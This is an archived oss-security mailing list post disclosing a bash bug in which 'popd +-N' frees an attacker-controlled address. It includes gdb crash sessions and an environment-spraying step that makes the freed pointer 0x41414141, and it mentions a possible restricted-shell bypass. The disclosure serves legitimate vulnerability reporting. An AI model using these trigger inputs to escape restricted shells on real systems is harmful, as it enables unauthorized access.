X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1410" "Thursday" "17" "November" "2016" "12:04:49" "-0500" "=?UTF-8?B?RmVybmFuZG8gTXXDsW96?=" "fernando@null-life.com" "<CAEr-gPFsVAB+5KrxRigmb=TkuSPxdGAW-GZ6cdQemxmJf2CFUA@mail.gmail.com>" "46" "[oss-security] bash - popd controlled free" nil nil nil "11" "2016111717:04:49" "[oss-security] bash - popd controlled free" (number mark "U       fernando@nul Nov 17   46/1410  " thread-indent "\"[oss-security] bash - popd controlled free\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 18159 invoked by uid 550); 17 Nov 2016 17:05:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18128 invoked from network); 17 Nov 2016 17:05:01 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=null-life-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=Mj+4UgrOgMLW7uuYQas7L3QpRSOft2l7N/o92EoQGM8=;
        b=yYyoHol3M7KHCwWQEtQlHsRalHRE6+cLGW49hKxxlJp5918gg/fkhLFJS9YhCcd/mJ
         ZfhJ6SV94ZcBfFALGBKjNb4f+lH7ysB5HWUVYFYanCXV4mKDZQMcNgiCZw99XeHXssw9
         /idRxxns2xKg6NVcxznKbF2hl2GxD2CfieZgraX0XEIh0KrNzNED47ShppNC6J5oYZoe
         LavHq5fCSI37uRUpynzWWRtRzW2lV6ejI0ToMnJlThAdxJ1Y+IQHNWzI+/Hn7ABABucD
         VCvH8bu9XVuhEPCjqppvLU7+kXSaLJtR5RArFLAn30/CX3CdIxYDvU/dmP4YgUHm24ty
         d4Kg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=Mj+4UgrOgMLW7uuYQas7L3QpRSOft2l7N/o92EoQGM8=;
        b=hSH2z1p/THEAfCN3d1poHB5Cr0o7ahqT3R0rOKTmbb0t9PmQyn52SPoj2SeviBJ3w9
         xozcu82fFDXYuDSue8KNe1tELXDALP4JL94wZ+Za84JzZsLCaN9erPO8pdmO/bBdPDTv
         1WjqLQWDGBig8wxOyEp+XcprAI/knKKxzgu0xVzRqUv/TURSkgX3MYznWnMwoM9Tscs0
         AmTKkgLJcyJhyi/3oQwBPxiClQHOoL4SJxMLk7LhraKFThJ3iT0C+pnfgji0Yk3B+1z3
         bRKACnmPRKgY93YvD08imKPvGcuUm2kXF67eUN84N6hbdzjCiHRScD7P2zXAz505ia4w
         fhqw==
X-Gm-Message-State: AKaTC02G78XnxP4fZjdiiT3Rv9gaNak83y+yvfukYMnYPnMrqkZUvwS2W+XEhcjmybvfN06yhr7EgeRxz4Bqpg==
X-Received: by 10.237.53.176 with SMTP id c45mr2796328qte.222.1479402289566;
 Thu, 17 Nov 2016 09:04:49 -0800 (PST)
MIME-Version: 1.0
X-Originating-IP: [190.109.97.221]
From: =?UTF-8?Q?Fernando_Mu=C3=B1oz?= <fernando@null-life.com>
Date: Thu, 17 Nov 2016 12:04:49 -0500
Message-ID: <CAEr-gPFsVAB+5KrxRigmb=TkuSPxdGAW-GZ6cdQemxmJf2CFUA@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: Chester Ramey <chet.ramey@case.edu>
Content-Type: text/plain; charset=UTF-8
Subject: [oss-security] bash - popd controlled free

bash - popd controlled free
====================

popd can be tricked to free a user supplied address in the following way:

$ popd +-111111

This could be used to bypass restricted shells (rsh) on some
environments to cause use-after-free.

This was already reported to bash devs and only considered a bug, if
Mitre consider it could have a security impact, please assign a CVE.

Details
======
$ gdb bash
...
(gdb) r -c 'popd +-67372036'
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/bashinstrumentado/bash-4.3/bash -c 'popd +-67372036'

Program received signal SIGSEGV, Segmentation fault.
0x0827f93a in popd_builtin (list=<optimized out>) at ./pushd.def:384
384          free (pushd_directory_list[i]);
(gdb) print pushd_directory_list[i]
Cannot access memory at address 0x10101010

----
$ export AA=`perl -e 'print "A"x100000'`
$ gdb ./bash
...
(gdb) x/s *((char **)environ+13)
0xbffe75d4:    "AA=", 'A' <repeats 197 times>...
(gdb) run -c 'popd +-805281142'
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/bash/bash-4.3/bash -c 'popd +-805281142'

Program received signal SIGSEGV, Segmentation fault.
internal_free (mem=0x41414141, file=0x83fb36c "./pushd.def", line=384,
flags=<optimized out>) at malloc.c:863
863      if (p->mh_alloc == ISMEMALIGN)


- Fernando
